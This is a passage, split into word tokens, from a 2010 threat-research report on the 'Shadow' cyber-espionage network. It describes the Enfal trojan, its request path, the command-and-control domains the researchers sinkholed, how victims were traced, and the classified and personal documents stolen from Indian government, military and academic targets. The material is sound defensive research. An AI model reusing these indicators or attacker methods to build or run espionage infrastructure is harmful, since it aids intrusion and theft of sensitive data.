"at", "least", "two", "other", ",", "possibly", "affiliated", ",", "malware", "networks", "."], ["When", "grouping", "malware", "networks", "together", "we", "interpret", "relationships", "between", "the", "command", "and", "control", "infrastructures", ",", "characteristics", "of", "the", "malware", ",", "attack", "vectors", "and", "exploits", "used", ",", "and", "any", "identifying", "information", "left", "behind", "by", "the", "attackers", "."], ["This", "allows", "us", "to", "track", "the", "activities", "of", "similar", "yet", "distinct", "groups", "of", "attackers", "over", "time", "."], ["More", "importantly", ",", "this", "historical", "perspective", "allows", "us", "to", "apply", "a", "granular", "level", "of", "analysis", "when", "investigating", "attacks", ",", "rather", "than", "simply", "grouping", "attackers", "and", "malware", "together", "by", "the", "country", "of", "origin", "."], ["When", "grouping", "malware", "we", "focus", "on", ":", "\u0083\u0083", "IP", "address", "relationships", "-", "the", "historical", "relationship", "between", "command", "and", "control", "domains", "that", "resolve", "to", "same", "IP", "addresses", "over", "time", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "24", "\u0083\u0083", "Malware", "connection", "relationships", "-", "malware", "found", "on", "one", "command", "and", "control", "server", "that", "connects", "to", "a", "different", "command", "and", "control", "server", "."], ["\u0083\u0083", "Malware", "file", "path", "relationships", "-", "the", "presence", "of", "distinctive", "file", "paths", "on", "multiple", "command", "and", "control", "servers", "."], ["There", "are", "limitations", "to", "this", "approach", "."], ["For", "example", ",", "multiple", "attackers", "could", "operate", "on", "a", "common", "infrastructure", ",", "perhaps", "supplied", "by", "a", "group", "that", "specialises", "in", "malicious", "hosting", "or", "selling", "registered", "domain", "names", "to", "be", "used", "as", "command", "and", "control", "servers", "."], ["Different", "groups", "of", "attackers", "could", "use", "the", "same", ",", "or", "very", "similar", ",", "malware", "."], ["However", ",", "when", "the", "malware", "is", "not", "publicly", "available", "or", "for", "sale", ",", "its", "use", "remains", "limited", "."], ["During", "the", "Shadow", "investigation", "we", "found", "the", "Enfal", "trojan", "among", "the", "instances", "of", "malware", "used", "by", "the", "attackers", "."], ["The", "Enfal", "trojan", "is", "not", "widely", "available", "and", "appears", "to", "be", "in", "use", "by", "affiliated", "malware", "networks", "that", "sometimes", "share", "a", "common", "command", "and", "control", "infrastructure", "."], ["In", "fact", ",", "domain", "names", "that", "have", "been", "used", "as", "Enfal", "command", "and", "control", "servers", "by", "separate", ",", "but", "possibly", "affiliated", ",", "attackers", "\u2014", "assam2008.net", ",", "msnxy.net", ",", "sysroots.net", ",", "womanld.com", ",", "womannana.com", ",", "lookbyturns", "."], ["com", ",", "macfeeresponse.com", "and", "macfeeresponse.org", "\u2014", "have", "now", "been", "incorporated", "into", "our", "sinkhole", "project", "."], ["This", "allows", "us", "to", "observe", "compromised", "computers", "that", "are", "still", "checking", "in", "with", "the", "command", "and", "control", "servers", "as", "well", "as", "the", "file", "paths", "being", "requested", "."], ["In", "some", "cases", ",", "we", "can", "obtain", "the", "names", "of", "documents", "located", "on", "the", "compromised", "computers", "."], ["These", "domain", "names", "are", "associated", "with", "Enfal", "and", "can", "also", "be", "linked", "to", "the", "active", "command", "and", "control", "servers", "in", "the", "Shadow", "network", "through", "common", "command", "and", "control", "server", "IP", "addresses", "."], ["Another", "group", "of", "attackers", "that", "also", "used", "the", "Enfal", "trojan", "were", "documented", "in", "2008", "by", "Maarten", "Van", "Horenbeeck", "."], ["He", "published", "information", "concerning", "his", "investigation", "into", "the", "targeted", "malware", "attacks", "which", "included", "the", "use", "of", "the", "Enfal", "Trojan", "dating", "back", "to", "2007", "."], ["Van", "Horenbeeck", "systematically", "documented", "a", "series", "of", "targeted", "attacks", "and", "clearly", "articulated", "the", "methodology", "of", "the", "attackers", ",", "one", "of", "which", "is", "now", "commonplace", "."], ["The", "attackers", "leverage", "social", "engineering", "tactics", "to", "entice", "the", "target", "into", "clicking", "on", "a", "malicious", "link", "or", "email", "attachment", "."], ["The", "malware", "then", "exploits", "a", "vulnerability", "in", "the", "user", "\u2019s", "client", "side", "software", ",", "such", "as", "a", "browser", ",", "Microsoft", "Word", ",", "Adobe", "Reader", "and", "so", "on", ",", "and", "begins", "communicating", "with", "a", "command", "and", "control", "server", "."], ["Enfal", "is", "recognisable", "due", "to", "the", "consistent", "filenames", "the", "malware", "requests", "from", "the", "command", "and", "control", "server", ",", "most", "notably", "\u201c", "/cgi", "-", "bin", "/", "owpq4.cgi", "\u201d", "."], ["Van", "Horenbeeck", "identified", "domain", "names", "used", "by", "Enfal", ",", "*", ".bluewinnt", "."], ["com", "and", "*", ".ggsddup.com", ",", "which", "are", "still", "in", "use", "today", "(", "Van", "Horenbeeck", "2008a", ";", "Van", "Horenbeeck", "2008b", ";", "Van", "Horenbeeck", "2007", ")", "."], ["While", "we", "were", "unable", "to", "find", "any", "instances", "of", "common", "command", "and", "control", "infrastructure", "between", "the", "Enfal", "network", "that", "Van", "Horenbeeck", "documented", ",", "the", "methods", "and", "tools", "of", "these", "attackers", "and", "the", "Shadow", "network", "are", "very", "similar", "."], ["The", "common", "use", "of", "the", "Enfal", "Trojan", "suggests", "that", "the", "attackers", "may", "be", "exchanging", "tools", "and", "techniques", "."], ["The", "profile", "of", "the", "victims", "from", "two", "separate", "Enfal", "-", "based", "networks", "in", "our", "DNS", "sinkhole", "suggest", "that", "the", "attackers", "have", "an", "interest", "in", "compromising", "similar", "sets", "of", "targets", "."], ["Finally", ",", "the", "failed", "DNS", "resolution", "for", "www.assam2008.net", "found", "on", "a", "computer", "at", "the", "OHHDL", "also", "compromised", "by", "the", "Shadow", "network", "indicates", "a", "possibly", "closer", "connection", ",", "or", "that", "they", "at", "least", "have", "both", "common", "tools", "and", "target", "sets", "."], ["PART", "4", ":"], ["Targets", "and", "Effects", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "4.1", "26", "Compromised", "Victims", ":", "The", "Evidence", "Mistakes", "on", "the", "part", "of", "the", "attackers", "allowed", "us", "to", "view", "the", "attackers", "\u2019", "list", "of", "victims", "at", "four", "command", "and", "control", "locations", "."], ["In", "addition", ",", "we", "were", "able", "to", "recover", "exfiltrated", "data", "from", "two", "locations", "."], ["This", "provided", "us", "with", "a", "snapshot", "of", "the", "computers", "that", "have", "been", "compromised", "by", "the", "attacks", "."], ["Thus", ",", "this", "is", "not", "a", "complete", "list", "of", "all", "those", "compromised", "by", "this", "attacker", "."], ["Rather", ",", "it", "is", "simply", "those", "checking", "in", "with", "or", "uploading", "data", "to", "the", "portions", "of", "the", "network", "that", "we", "were", "able", "to", "view", "."], ["Moreover", ",", "there", "was", "considerable", "overlap", "between", "different", "methods", "of", "command", "and", "control", ",", "with", "individual", "computers", "checking", "in", "at", "multiple", "locations", "."], ["Therefore", ",", "we", "do", "not", "have", "consistent", "data", "across", "all", "compromised", "computers", "."], ["There", "are", "two", "categories", "of", "victims", ":", "those", "for", "whom", "we", "only", "have", "technical", "identifying", "information", ",", "such", "as", "IP", "addresses", ";", "and", "those", "from", "whom", "we", "have", "recovered", "exfiltrated", "data", "but", "for", "whom", "we", "do", "not", "have", "IP", "addresses", "."], ["In", "cases", "where", "we", "do", "not", "have", "IP", "addresses", ",", "the", "identity", "of", "the", "victim", "is", "determined", "from", "the", "contextual", "information", "found", "within", "the", "exfiltrated", "data", "itself", "."], ["We", "obtained", "information", "on", "victims", "from", ":", "\u0083\u0083", "a", "web", "-", "based", "interface", "that", "lists", "cursory", "information", "on", "compromised", "computers", "located", "on", "one", "command", "and", "control", "server", ";", "\u0083\u0083", "text", "files", "in", "web", "-", "accessible", "directories", "on", "three", "command", "and", "control", "servers", "that", "list", "detailed", "information", "on", "compromised", "computers", ";", "\u0083\u0083", "information", "obtained", "from", "email", "accounts", "used", "for", "command", "and", "control", "of", "compromised", "computers"], ["\u0083\u0083", "information", "obtained", "from", "one", "command", "and", "control", "server", "from", "which", "we", "retrieved", "exfiltrated", "documents"], ["(", "but", "not", "necessarily", "technical", "identifying", "information", ")", ";"], ["\u0083\u0083", "information", "obtained", "from", "our", "DNS", "sinkhole", "."], ["The", "primary", "method", "of", "identification", "used", "in", "this", "section", "is", "based", "upon", "the", "IP", "address", "of", "the", "compromised", "computer", "."], ["We", "looked", "up", "the", "associated", "IP", "address", "in", "all", "five", "Regional", "Internet", "Registries", "(", "RiR", ")", "in", "order", "to", "identify", "the", "country", "and", "network", "to", "which", "the", "IP", "address", "is", "assigned", "."], ["We", "then", "performed", "a", "reverse", "Domain", "Name", "System", "(", "DNS", ")", "look", "-", "up", "on", "each", "IP", "address", "."], ["DNS", "is", "the", "system", "that", "translates", "domain", "names", "into", "IP", "addresses", ";", "reverse", "DNS", "is", "a", "system", "that", "translates", "an", "IP", "address", "into", "a", "domain", "name", "."], ["This", "can", "potentially", "provide", "additional", "information", "about", "the", "entity", "that", "has", "been", "assigned", "a", "particular", "IP", "address", "."], ["If", "we", "discovered", "a", "domain", "name", ",", "we", "then", "looked", "up", "its", "registration", "in", "WHOIS", ",", "which", "is", "a", "public", "database", "of", "all", "domain", "name", "registrations", "and", "provides", "information", "about", "who", "registered", "the", "domain", "name", "."], ["It", "was", "possible", "to", "identify", "the", "geographic", "location", "of", "the", "compromised", "computer", "at", "the", "country", "level", "as", "well", "as", "the", "network", "to", "which", "the", "IP", "address", "was", "assigned", "."], ["However", ",", "in", "most", "cases", "there", "was", "little", "information", "in", "the", "RiRs", "pertaining", "to", "the", "exact", "identity", "of", "the", "compromised", "entity", "."], ["Where", "possible", ",", "we", "note", "the", "entity", "identified", "by", "data", "obtained", "from", "the", "RiRs", "."], ["The", "following", "list", "of", "compromised", "computers", "was", "generated", "by", "parsing", "information", "from", "unique", "victims", ",", "not", "solely", "IP", "addresses", "."], ["The", "attackers", "assign", "the", "compromised", "computer", "a", "name", "based", "on", "the", "host", "name", "of", "the", "computer", ",", "which", "allows", "us", "to", "identify", "unique", "victims", "rather", "than", "relying", "only", "on", "IP", "addresses", "."], ["In", "fact", ",", "several", "of", "the", "unique", "victims", "have", "multiple", "IP", "addresses", "associated", "with", "them", ",", "sometimes", "spanning", "multiple", "countries", "."], ["Here", "we", "have", "generated", "a", "geographic", "breakdown", "based", "on", "the", "first", "IP", "addresses", "recorded", "for", "each", "compromised", "computer", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "27", "Figure", "4", ":"], ["Locations", "of", "Compromised", "Computers", "in", "the", "Shadow", "Network", "While", "there", "is", "considerable", "geographic", "diversity", ",", "there", "is", "a", "high", "concentration", "of", "compromised", "computers", "located", "in", "India", "."], ["However", ",", "we", "were", "only", "able", "to", "identify", "two", "of", "the", "compromised", "entities", ":", "\u0083\u0083", "Embassy", "of", "India", ",", "United", "States"], ["\u0083\u0083", "Embassy", "of", "Pakistan", ",", "United", "States", "4.1.1"], ["Sinkhole"], ["A", "DNS", "sinkhole", "server", "is", "a", "system", "that", "is", "designed", "to", "take", "requests", "from", "a", "botnet", "or", "infected", "systems", "and", "record", "the", "incoming", "information", "."], ["The", "sinkhole", "server", "is", "not", "under", "the", "control", "of", "the", "malware", "authors", "and", "can", "be", "used", "to", "gain", "an", "understanding", "of", "a", "botnet", "\u2019s", "operation", "."], ["There", "are", "a", "few", "different", "techiques", "that", "are", "used", "to", "sinkhole", "botnet", "traffic", "."], ["The", "easiest", "method", "is", "to", "simply", "register", "an", "expired", "domain", "that", "was", "previously", "used", "to", "control", "victim", "systems", "."], ["Being", "able", "to", "do", "this", "generally", "indicates", "the", "botnet", "operator", "has", "lost", "control", "of", "the", "domain", ",", "forgotten", "to", "renew", "it", ",", "or", "that", "the", "botnet", "has", "been", "abandoned", "."], ["Another", "method", "focuses", "on", "reverse", "-", "engineering", "the", "malware", "to", "determine", "if", "it", "has", "\u201c", "fail", "over", "\u201d", "command", "and", "control", "servers", "or", "special", "methods", "to", "compute", "future", "domains", "."], ["This", "may", "require", "that", "a", "domain", "name", "generation", "algorithm", "be", "discovered", "and", "that", "one", "must", "register", "the", "domain", "names", "before", "the", "attacker", "does", "(", "Stone", "-", "Gross", "et", "al", ".", "2009", ")", "."], ["During", "the", "GhostNet", "investigation", "we", "found", "that", "a", "computer", "at", "the", "OHHDL", "was", "compromised", "by", "both", "the", "GhostNet", "and", "what", "we", "are", "now", "calling", "the", "Shadow", "network", "."], ["We", "had", "a", "list", "of", "serveral", "domains", "that", "were", "expiring", "that", "we", "had", "linked", "to", "attacks", "against", "OHHDL", "."], ["We", "were", "able", "to", "register", "several", "of", "these", "domain", "names", "in", "order", "to", "gather", "information", "about", "the", "network", "\u2019s", "command", "and", "control", "infrastructure", ",", "communication", "methods", ",", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "28", "and", "victim", "systems", "."], ["We", "were", "able", "to", "register", "and", "monitor", "four", "of", "the", "domain", "names", "mentioned", "in", "Tracking"], ["GhostNet", "."], ["In", "addition", ",", "we", "were", "able", "to", "register", "several", "others", "which", "we", "linked", "to", "the", "Shadow", "network", "along", "with", "one", ",", "www.assam2008.net", ",", "which", "we", "believe", "to", "be", "yet", "another", "separate", ",", "but", "possibly", "affiliated", ",", "network", "."], ["\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "www.assam2008.net", "www.msnxy.net", "www.sysroots.net", "www.womanld.com", "www.womannana.com", "www.lookbyturns.com", "www.macfeeresponse.com", "www.macfeeresponse.org"], ["We", "were", "able", "to", "observe", "the", "file", "paths", "associated", "with", "malware", "that", "were", "requested", "by", "compromised", "computers", "."], ["In", "total", ",", "we", "found", "that", "during", "this", "period", "6,902", "unique", "IPs", "requested", "paths", "associated", "with", "the", "malware", "that", "used", "these", "hosts", "as", "command", "and", "control", "servers", "."], ["However", ",", "counting", "the", "number", "of", "infected", "hosts", "purely", "by", "IP", "addresses", "is", "problematic", "."], ["In", "fact", ",", "botnets", "are", "generally", "much", "smaller", "than", "the", "total", "sum", "of", "unique", "IP", "addresses", "would", "suggest", "(", "Stone", "-", "Gross", "et", "al", ".", "2009", ";", "Rajab", "et", "al", ".", "2007", ")", "."], ["This", "network", ",", "which", "is", "focused", "on", "stealing", "documents", "from", "specific", "targets", ",", "is", "expected", "to", "be", "small", "in", "size", "."], ["Figure", "5", ":"], ["Relationship", "between", "the", "DNS", "Sinkhole", "and", "Live", "Command", "and", "Control", "Servers", "This", "Palantir", "screen", "shot", "captures", "the", "relationship", "between", "the", "domain", "names", "in", "our", "sinkhole", "(", "green", ")", ",", "the", "web", "servers", "they", "were", "formerly", "hosted", "on", "(", "red", ")", "and", "the", "Shadow", "network", "\u2019s", "active", "domain", "names", "(", "blue", ")", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS"], ["What", "is", "more", "notable", "is", "the", "distribution", "of", "compromised", "computers", "across", "countries", "."], ["Figure", "6", ":"], ["Locations", "of", "Compromised", "Computers", "in", "our", "Sinkhole", "From", "the", "recovered", "IP", "addresses", "we", "were", "able", "to", "identify", "the", "following", "entities", "of", "interest", ":", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "\u0083\u0083", "Honeywell", ",", "United", "States", "New", "York", "University", ",", "United", "States"], ["University", "of", "Western", "Ontario", ",", "Canada", "High", "Commission", "of", "India", ",", "United", "Kingdom"], ["Vytautas", "Magnus", "University", ",", "Lithuania", "Kaunas", "University", "of", "Technology", ",", "Lithuania", "National", "Informatics", "Centre", ",", "India"], ["New", "Delhi", "Railway", "station", "(", "*", "railnet.gov.in", ")", ",", "India", "Times", "of", "India", ",", "India"], ["Petro", "IT", ",", "(", "reserved123.petroitg.com", ")", ",", "India", "Federation", "of", "Indian", "Chambers", "of", "Commerce", "and", "Industry", ",", "India", "Commission", "for", "Science", "and", "Technology", "for", "Sustainable", "Development", "in", "the", "South", ",", "Pakistan", "29", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "4.2", "30", "Victim", "Analysis", "on", "the", "Basis", "of", "Recovered", "Documents"], ["In", "total", "we", "recovered", "data", "from", "44", "compromised", "computers", "."], ["The", "documents", "recovered", "from", "the", "OHHDL", "were", "reconstructed", "from", "captured", "network", "traffic", ",", "while", "the", "remainder", "were", "retrieved", "from", "an", "open", "directory", "on", "one", "command", "and", "control", "server", "."], ["Only", "seven", "of", "the", "remaining", "43", "compromised", "computers", "(", "not", "counting", "the", "OHHDL", "computer", ")", "for", "which", "we", "were", "able", "to", "recover", "exfiltrated", "data", "also", "checked", "in", "with", "the", "same", "control", "server", "."], ["Therefore", "we", "can", "only", "identify", "the", "IP", "addresses", "of", "these", "seven", "computers", "."], ["Five", "of", "these", "seven", "computers", "have", "IP", "addresses", "that", "are", "assigned", "to", "India", ",", "while", "the", "remaining", "two", "are", "assigned", "to", "Thailand", "and", "the", "PRC", "."], ["As", "noted", "below", ",", "the", "Chinese", "IP", "address", "represents", "the", "attacks", "on", "IP", "addresses", "along", "with", "two", "test", "(", "junk", ")", "text", "files", "that", "appear", "to", "have", "been", "used", "for", "testing", "the", "malware", "."], ["We", "determined", "the", "country", "and", "entity", "from", "which", "the", "documents", "were", "exfiltrated", "based", "on", "the", "content", "of", "the", "documents", "themselves", "in", "cases", "where", "we", "did", "not", "obtain", "an", "IP", "address", "."], ["In", "addition", ",", "we", "assigned", "two", "country", "codes", "to", "the", "compromised", "computers", ":", "one", "country", "code", "indicates", "the", "physical", "(", "IP", ")", "country", "in", "which", "the", "computer", "is", "located", ",", "and", "the", "second", "country", "code", "indicates", "the", "country", "of", "ownership", "."], ["Thus", "a", "compromised", "computer", "at", "a", "foreign", "embassy", "would", "be", "assigned", "a", "country", "code", "based", "on", "its", "geographical", "region", ",", "and", "a", "second", "based", "on", "the", "home", "country", "to", "which", "the", "foreign", "mission", "belongs", "."], ["Based", "on", "geographic", "location", ",", "the", "vast", "majority", "are", "in", "India", "."], ["Figure", "7", ":"], ["Locations", "of", "Compromised", "Computers", "from", "which", "Documents", "were", "Exfiltrated", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "Based", "on", "the", "country", "of", "ownership", ",", "the", "results", "show", "an", "even", "higher", "number", "for", "India", "."], ["Figure", "8", ":"], ["Locations", "of", "Ownership", "of", "Exfiltrated", "Documents", "31", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "4.3", "32", "Geographic", "Victim", "Distribution", "Figure", "9", ":", "Geographic", "distribution", "of", "compromised", "hosts"], ["This", "screen", "capture", "of", "Palantir", "\u2019s", "heatmap", "application", "demonstrates", "the", "concentrations", "of", "(", "non", "-", "unique", ")", "IP", "addresses", "of", "compromised", "hosts", "."], ["The", "largest", "concentration", "(", "red", ")", "is", "in", "India", "."], ["4.3.1", "Targets", "Diplomatic", "Missions", "and", "Government", "Entities", "Diplomatic", "missions", "and", "government", "entities", "exchange", "sensitive", "information", ",", "which", "sometimes", "finds", "its", "way", "onto", "unclassified", "systems", "."], ["During", "our", "investigation", ",", "we", "recovered", "documents", "that", "are", "extremely", "sensitive", "from", "a", "national", "security", "perspective", "as", "well", "as", "documents", "that", "contain", "sensitive", "information", "that", "could", "be", "exploited", "by", "an", "adversary", "for", "intelligence", "purposes", "."], ["We", "recovered", "one", "document", "that", "appears", "to", "be", "an", "encrypted", "diplomatic", "correspondence", ",", "two", "documents", "classified", "as", "\u201c", "SECRET", "\u201d", ",", "six", "as", "\u201c", "RESTRICTED", "\u201d", ",", "and", "five", "as", "\u201c", "CONFIDENTIAL", "\u201d", "."], ["These", "documents", "contain", "sensitive", "information", "taken", "from", "a", "member", "of", "the", "National", "Security", "Council", "Secretariat", "concerning", "secret", "assessments", "of", "India", "\u2019s", "security", "situation", "in", "the", "states", "of", "Assam", ",", "Manipur", ",", "Nagaland", "and", "Tripura", ",", "as", "well", "as", "concerning", "the", "Naxalites", "and", "Maoists", "."], ["In", "addition", ",", "they", "contain", "confidential", "information", "taken", "from", "Indian", "embassies", "regarding", "India", "\u2019s", "international", "relations", "with", "and", "assessments", "of", "activities", "in", "West", "Africa", ",", "Russia", "/", "Commonwealth", "of", "Independent", "States", "and", "the", "Middle", "East", ",", "as", "well", "as", "visa", "applications", ",", "passport", "office", "circulars", "and", "diplomatic", "correspondence", "."], ["The", "attackers", "also", "exfiltrated", "detailed", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "33", "personal", "information", "regarding", "a", "member", "of", "the", "Directorate", "General", "of", "Military", "Intelligence", "."], ["These", "compromises", "and", "the", "character", "of", "the", "data", "exfiltrated", "extends", "to", "non", "-", "governmental", "targets", "as", "well", "."], ["Some", "of", "the", "academics", "and", "journalists", "that", "were", "compromised", "were", "interested", "in", "and", "regularly", "reporting", "on", "sensitive", "topics", "such", "as", "Jammu", "and", "Kashmir", "."], ["National", "Security", "and", "Defence"], ["During", "our", "investigations", "we", "suspected", "that", "a", "variety", "of", "military", "computers", "had", "been", "compromised", "as", "well", "as", "the", "computers", "of", "defence", "-", "oriented", "academics", "and", "journals", "."], ["While", "none", "of", "the", "information", "obtained", "was", "classified", ",", "the", "documents", "we", "recovered", "reveal", "information", "regarding", "sensitive", "topics", "."], ["Although", "there", "is", "public", "information", "available", "on", "these", "miltary", "projects", ",", "it", "indicates", "that", "the", "attackers", "managed", "to", "compromise", "the", "right", "set", "of", "individuals", "that", "may", "have", "knowledge", "of", "these", "systems", "that", "is", "not", "publicly", "known", "."], ["We", "recovered", "documents", "and", "presentations", "relating", "to", "the", "following", "projects", ":", "\u0083\u0083", "Pechora", "Missile", "System", "-", "an", "anti", "-", "aircraft", "surface", "-", "to", "-", "air", "missile", "system", "."], ["\u0083\u0083", "Iron", "Dome", "Missile", "System", "-", "a", "mobile", "missile", "defence", "system", "(", "Ratzlav", "-", "Katz", "2010", ")", "."], ["\u0083\u0083", "Project", "Shakti", "-", "an", "artillery", "combat", "command", "and", "control", "system", "(", "Frontier", "India", "2009", ")", "."], ["We", "also", "found", "that", "documents", "relating", "to", "network", "centricity", "(", "SP", "\u2019s", "Land", "Forces", "2008", ")", "and", "network", "-", "centric", "warfare", "had", "been", "exfiltrated", ",", "along", "with", "documents", "detailing", "plans", "for", "intelligence", "fusion", "and", "technologies", "for", "monitoring", "and", "analysing", "network", "data", "(", "Defence", "Research", "and", "Development", "Organisation", "2009", ")", "."], ["Academics", "/", "Journalists", "focused", "on", "the", "PRC"], ["During", "our", "investigations", "we", "found", "that", "a", "variety", "of", "academic", "targets", "had", "been", "compromised", ",", "including", "those", "at", "the", "Institute", "for", "Defence", "Studies", "and", "Analyses", "(", "IDSA", ")", "as", "well", "as", "journalists", "at", "India", "Strategic", "defence", "magazine", "and", "FORCE", "magazine", "."], ["The", "exfiltrated", "papers", "included", "those", "discussing", "the", "containment", "of", "the", "PRC", ",", "Chinese", "military", "exports", ",", "and", "Chinese", "foreign", "policy", "on", "Taiwan", "and", "Sino", "-", "Indian", "relations", "."], ["More", "specifically", ",", "there", "were", "documents", "that", "focused", "on", "ethnicity", ",", "religion", "and", "politics", "in", "Central", "Asia", ",", "and", "the", "links", "between", "armed", "groups", "and", "the", "PRC", "."], ["Although", "the", "academic", "papers", "exfiltrated", "by", "the", "attackers", "are", "publicly", "available", ",", "the", "content", "of", "the", "material", "indicates", "that", "the", "attackers", "managed", "to", "compromise", "those", "with", "a", "keen", "interest", "in", "the", "PRC", "."], ["4.3.2"], ["Affected", "Institutions"], ["During", "our", "investigations", "we", "found", "that", "a", "variety", "of", "personal", "information", "belonging", "to", "individuals", "had", "been", "compromised", "."], ["This", "included", "various", "lists", "of", "contacts", "along", "with", "their", "personal", "details", "that", "could", "be", "used", "by", "the", "attackers", "."], ["It", "also", "included", "information", "about", "travel", ",", "including", "air", "and", "rail", "tickets", ",", "receipts", ",", "invoices", "and", "other", "billing", "information", "."], ["In", "addition", "we", "found", "personal", "banking", "information", ",", "scans", "of", "identification", "documents", ",", "job", "(", "and", "other", ")", "applications", ",", "legal", "documents", "and", "information", "about", "ongoing", "court", "cases", "."], ["The", "attackers", "also", "exfiltrated", "personal", "email", "communications", "."], ["All", "of", "this", "information", "can", "be", "leveraged", "for", "future", "attacks", ",", "especially", "attacks", "against", "those", "within", "the", "compromised", "individual", "\u2019s", "social", "network", "."], ["\u0083\u0083", "National", "Security", "Council", "Secretariat", ",", "India"], ["The", "National", "Security", "Council", "Secretariat", "(", "NSCS", ")", "of", "India", "is", "comprised", "of", "the", "Joint", "Intelligence", "Committee", "and", "is", "a", "component", "of", "the", "National", "Security", "Council", "established", "in", "1998", "along", "with", "a", "Strategic", "Policy", "Group", "and", "an", "Advisory", "Board", "."], ["The", "National", "Security", "Council", "is", "headed", "by", "the", "Prime", "Minister", "of", "India", "and", "is", "responsible", "for", "strategic", "planning", "in", "the", "area", "of", "national", "security", "(", "Subrahmanyam", "2010", ";", "Indian", "Embassy", "1998", ")", "."], ["We", "assess", "that", "a", "computer", "at", "the", "NSCS", "was", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "fourteen", "documents", ",", "including", "two", "documents", "marked", "\u201c", "SECRET", ",", "\u201d", "were", "exfiltrated", "."], ["In", "addition", "to", "documents", "containing", "the", "personal", "and", "financial", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "4", ":", "TARGETS", "&", "EFFECTS", "34", "information", "of", "what", "appears", "to", "be", "the", "compromised", "individual", ",", "the", "exfiltrated", "documents", "focus", "on", "India", "\u2019s", "security", "situation", "in", "the", "states", "of", "Assam", ",", "Manipur", ",", "Nagaland", "and", "Tripura", "as", "well", "as", "the", "Naxalites", ",", "Maoists", ",", "and", "what", "is", "referred", "to", "as", "\u201c", "left", "wing", "extremism", ".", "\u201d"], ["\u0083\u0083", "Diplomatic", "Missions", ",", "India", "India", "maintains", "numerous", "diplomatic", "missions", "abroad", "that", "provide", "consular", "services", "relating", "to", "passports", "and", "visas", "as", "well", "as", "faciltaing", "trade", ",", "commerce", "and", "engaging", "in", "diplomatic", "relations", "(", "Indian", "government", "2010", ")", "."], ["We", "assess", "that", "computers", "at", "the", "Embassy", "of", "India", ",", "Kabul", ",", "the", "Embassy", "of", "India", ",", "Moscow", ",", "the", "Consulate", "General", "of", "India", ",", "Dubai", ",", "and", "the", "High", "Commission", "of", "India", "in", "Abuja", ",", "Nigeria", "were", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "99", "documents", ",", "including", "what", "appears", "to", "be", "one", "encrypted", "diplomatic", "correspondence", "as", "well", "as", "five", "documents", "marked", "\u201c", "RESTRICTED", "\u201d", "and", "four", "documents", "marked", "\u201c", "CONFIDENTIAL", ",", "\u201d", "were", "exfiltrated", "."], ["In", "addition", "to", "documents", "containing", "personal", ",", "financial", ",", "and", "travel", "information", "on", "embassy", "and", "diplomatic", "staff", ",", "the", "exfiltrated", "documents", "included", "numerous", "visa", "applications", ",", "passport", "office", "circulars", ",", "and", "country", "assessments", "and", "reports", "."], ["Confidential", "visa", "applications", "from", "citizens", "of", "Afghanistan", ",", "Australia", ",", "Canada", ",", "the", "PRC", ",", "Croatia", ",", "Denmark", ",", "Germany", ",", "India", ",", "Ireland", ",", "Italy", ",", "New", "Zealand", ",", "Philippines", ",", "Senegal", ",", "Switzerland", ",", "Uganda", ",", "and", "the", "United", "Kingdom", "were", "among", "the", "exfiltrated", "documents", "."], ["\u0083\u0083", "Military", "Engineer", "Services", ",", "India"], ["The", "Military", "Engineer", "Services", "(", "MES", ")", "is", "a", "government", "construction", "agency", "that", "provides", "services", "to", "the", "Indian", "Army", ",", "Navy", "and", "Air", "Force", "."], ["In", "addition", ",", "the", "MES", "services", "the", "government", "sector", "and", "civil", "works", "projects", "."], ["We", "assess", "that", "computers", "at", "the", "MES", "-", "Bengdubi", ",", "MES", "-", "Kolkata", ",", "MES(AF)-Bangalore", ",", "and", "MES", "-", "Jalandhar", "were", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "78", "documents", "were", "exfiltrated", "."], ["While", "these", "documents", "included", "manuals", "and", "forms", "that", "would", "not", "be", "considered", "sensitive", ",", "they", "also", "included", "documents", "that", "contained", "private", "information", "on", "personnel", ",", "and", "documents", "and", "presentations", "concerning", "the", "financing", "and", "scheduling", "of", "specific", "engineering", "projects", "."], ["\u0083\u0083", "Military", "Personnel", ",", "India"], ["We", "assess", "that", "computers", "linked", "with", "the", "21", "Mountain", "Artillery", "Brigade", "in", "the", "state", "of", "Assam", ",", "the", "Air", "Force", "Station", ",", "Race", "Course", ",", "New", "Delhi", "and", "the", "Air", "Force", "Station", ",", "Darjipura", "Vadodara", ",", "Gujarat", "were", "compromised", "based", "on", "the", "documents", "exfiltrated", "by", "the", "attackers", "."], ["During", "the", "period", "in", "which", "we", "monitored", "the", "attackers", ",", "sixteen", "documents", "were", "exfiltrated", "."], ["One", "document", "contained", "personal", "information", "on", "Saikorian", "alumni", "of", "the", "Sainik", "School", ",", 